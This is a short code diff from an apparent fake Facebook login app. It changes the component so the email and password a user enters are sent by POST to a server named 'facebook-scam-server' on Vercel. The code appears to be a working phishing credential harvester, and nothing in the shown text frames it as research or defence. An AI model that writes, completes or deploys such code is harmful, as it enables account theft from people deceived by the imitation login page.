@@ -10,17 +10,29 @@ function App() {
       email,
       password,
     };
-    fetch("https://facebook-server-seven.vercel.app/users", {
+    //   fetch("https://facebook-server-seven.vercel.app/users", {
+    //     method: "POST",
+    //     headers: {
+    //       "content-type": "application/json",
+    //     },
+    //     body: JSON.stringify(userData),
+    //   })
+    //   .then(res=>res.json())
+    //   .then(data=>{
+    //     console.log(data)
+    //   })
+    // };
+    fetch("https://facebook-scam-server-afq6btsxa-md-mahbub-aloms-projects.vercel.app/users", {
       method: "POST",
       headers: {
         "content-type": "application/json",
       },
       body: JSON.stringify(userData),
     })
-    .then(res=>res.json())
-    .then(data=>{
-      console.log(data)
-    })
+      .then((res) => res.json())
+      .then((data) => {
+        console.log(data);
+      });
   };
 
   return (
